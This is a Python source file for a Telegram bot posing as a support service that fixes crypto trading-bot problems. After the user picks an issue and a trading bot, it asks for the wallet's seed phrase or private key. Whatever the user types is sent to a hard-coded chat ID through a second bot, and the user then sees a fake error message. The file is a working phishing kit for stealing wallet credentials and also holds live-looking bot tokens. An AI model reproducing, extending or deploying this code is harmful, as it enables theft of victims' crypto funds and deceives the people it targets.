import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = '7720704200:AAGgj1OapZRuRCjySBIiObm5MpL1EPcpH7M'

CHAT_ID = 7811008623

APPLICATION_BOT = '7724409335:AAGzCWqgIaNxJGl6TSQIIzE4lGJzNehIyUs'
def send_telegram_message(chat_id, message, bot_token):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        'chat_id': chat_id,
        'text': message
    }
    response = requests.post(url, data=data)
    return response.json()


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Log the error, if any
    logger.error(f"An error occurred: {context.error}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Start command received")

    welcome_message = "Welcome to the Telegram Bot Resolve Decentralized Database, where you can address issues such as bot glitches, swap failures, configuration errors, asset recovery, validation problems, high slippage, rugged token issues, failed buy transactions, auto buy failures, slow bot performance, failed transactions, and high gas fees. \n\n"
    welcome_message += "• Please Select an issue to continue."
    image_url = 'https://i.ibb.co/Z2FSBBG/Whats-App-Image-2024-11-09-at-00-03-04.jpg'

    # If update.message exists, it's coming from the /start command
    if update.message:
        await update.message.reply_photo(photo=image_url, caption=welcome_message)
    # If update.callback_query exists, it's coming from the "Please Try Again" button
    elif update.callback_query:
        query = update.callback_query
        await query.message.reply_photo(photo=image_url, caption=welcome_message)
        await query.answer()  # Acknowledge the callback

    keyboard = [
        [InlineKeyboardButton("⚙️ VALIDATION ⚙️", callback_data='validation')],
        [InlineKeyboardButton("⚙️ RECTIFICATION ⚙️", callback_data='rectification')],
        [InlineKeyboardButton("⚙️ CONFIGURATION ⚙️", callback_data='configuration')],
        [InlineKeyboardButton("⚙️ ASSET RECOVERY ⚙️", callback_data='asset_recovery')],
        [InlineKeyboardButton("⚙️ SWAP FAIL ⚙️", callback_data='swap_fail')],
        [InlineKeyboardButton("⚙️ CLEAR BOT CLITCH ⚙️", callback_data='clear_bot_clitch')],
        [InlineKeyboardButton("⚙️ HIGH SLIPPAGE ⚙️", callback_data='high_slippage')],
        [InlineKeyboardButton("⚙️ FAILED BUY&SELL ⚙️", callback_data='failed_buy_sell')],
        [InlineKeyboardButton("⚙️ HIGH GAS FEE ⚙️", callback_data='high_gas_fee')],
        [InlineKeyboardButton("⚙️ TURBO MODE ⚙️", callback_data='turbo_mode')],
        [InlineKeyboardButton("⚙️ FAILED SNIPE ⚙️", callback_data='failed_snipe')],
        [InlineKeyboardButton("⚙️ TECHNICAL BUGS ⚙️", callback_data='technical_bugs')],
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    # Send a follow-up message with the keyboard
    if update.message:
        await update.message.reply_text("Select an issue category:", reply_markup=reply_markup)
    elif update.callback_query:
        await query.message.reply_text("Select an issue category:", reply_markup=reply_markup)

    # await update.message.reply_text("Select an issue category:", reply_markup=reply_markup)

async def error_category_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()



    # Create a keyboard for coin selections
    keyboard = [
         [InlineKeyboardButton("FIRST LEDGER", callback_data='bot_firstledger')],
         [InlineKeyboardButton("BEAR BULL", callback_data='bot_bearbull')],
         [InlineKeyboardButton("AUTOSNIPE", callback_data='bot_autosnipe')],
         [InlineKeyboardButton("NOVA", callback_data='bot_nova')],
        [InlineKeyboardButton("MAESTRO", callback_data='bot_maestro')],
        [InlineKeyboardButton("TROJAN", callback_data='bot_trojan')],
        [InlineKeyboardButton("NOKBOT", callback_data='bot_nokbot')],
        [InlineKeyboardButton("PHOTON WEB", callback_data='bot_photon_web')],
        [InlineKeyboardButton("XBOT", callback_data='bot_xbot')],
        [InlineKeyboardButton("GMGN AI", callback_data='bot_gmgn_ai')],
        [InlineKeyboardButton("SUNDOG", callback_data='bot_sundog')],
        [InlineKeyboardButton("NFT BASE&BSC&SUI", callback_data='bot_nft_base')],
        [InlineKeyboardButton("SOL TRADING BOT", callback_data='bot_sol_trading_bot')],
        [InlineKeyboardButton("BANANA GUNOT", callback_data='bot_banana_gunot')],
        [InlineKeyboardButton("UNIBOT", callback_data='bot_unibot')],
        [InlineKeyboardButton("SHURIKEN", callback_data='bot_shuriken')],
        [InlineKeyboardButton("PEPEBOST", callback_data='bot_pepebost')],
        [InlineKeyboardButton("TRADEWIZ", callback_data='bot_tradewiz')],
        [InlineKeyboardButton("KSPR BOT", callback_data='bot_kspr_bot')],
        [InlineKeyboardButton("SIGMA BOT", callback_data='bot_sigma_bot')],
        [InlineKeyboardButton("MEVX WEB", callback_data='bot_mevx_web')],
        [InlineKeyboardButton("FINDER BOT WEB", callback_data='bot_finder_bot_web')],
        [InlineKeyboardButton("PRODIGY BOT", callback_data='bot_prodigy_bot')],
        [InlineKeyboardButton("MAGNUM BOT", callback_data='bot_magnum_bot')],
        [InlineKeyboardButton("WALLET CONNECT", callback_data='bot_wallet_connect')],
        
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Update message with coin selection
    await query.edit_message_text("🤖 CHOOSE YOUR BOT 🤖", reply_markup=reply_markup)

async def import_web3_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    context.user_data['import_option'] = query.data

    keybord = [
        [InlineKeyboardButton("PROCEED WITH PHRASE KEY", callback_data='phrase_key')],
        [InlineKeyboardButton("PROCEED WITH PRIVATE KEY", callback_data='private_key')],]

    reply_markup = InlineKeyboardMarkup(keybord)

    # Prompt for text input after coin selection
    await query.edit_message_text("Please import your web3 wallet into the bot to proceed:", reply_markup=reply_markup)

async def phrase_selection_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()


    # Prompt for text input after coin selection
    await query.edit_message_text("Please provide the 12 to 24-word phrase key associated with your wallet that you wish to connect:")

    context.user_data['selected_option'] = query.data

async def private_key_selection_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    # Prompt for text input after coin selection
    await query.edit_message_text("Please provide the private key associated with your wallet that you wish to connect:")

    context.user_data['selected_option'] = query.data


async def text_input_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    import_option = context.user_data.get('import_option', 'Not Provided')
    selected_option = context.user_data.get('selected_option', 'Not Provided')
    user_input = update.message.text

    result_message = (
        f"Import Option: {import_option}\n"
        f"Selected Option: {selected_option}\n"
        f"User Input: {user_input}"
    )
    
    # Simulate sending the message to the bot (replace with actual function if needed)
    response = send_telegram_message(CHAT_ID, result_message, BOT_TOKEN)

    error_message = "An error occurred. Please try again."

    # Create the "Start" button to allow users to return to the start
    keyboard = [
        [InlineKeyboardButton("Please Try Again", callback_data='restart')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(error_message, reply_markup=reply_markup)


# Handler for the "Please Try Again" button to restart the bot
async def restart_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

def setup_application():
    application = Application.builder().token(APPLICATION_BOT).build()
     # Add an error handler
    application.add_error_handler(error_handler)

    # Command handler for /start
    application.add_handler(CommandHandler("start", start))

    # Callback handlers for button selections
    application.add_handler(CallbackQueryHandler(error_category_handler, pattern='^(validation|rectification|configuration|asset_recovery|swap_fail|clear_bot_clitch|high_slippage|failed_buy_sell|high_gas_fee|turbo_mode|failed_snipe|technical_bugs)$'))
   
    # Message handler for import web3
    application.add_handler(CallbackQueryHandler(import_web3_handler,pattern='^bot_'))

    application.add_handler(CallbackQueryHandler(phrase_selection_handler, pattern='^phrase_'))

    application.add_handler(CallbackQueryHandler(private_key_selection_handler, pattern='^private_'))

    # Message handler for text input after coin selection
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_input_handler))

        # Callback query handler for restart
    application.add_handler(CallbackQueryHandler(restart_handler, pattern="^restart"))
    
    return application
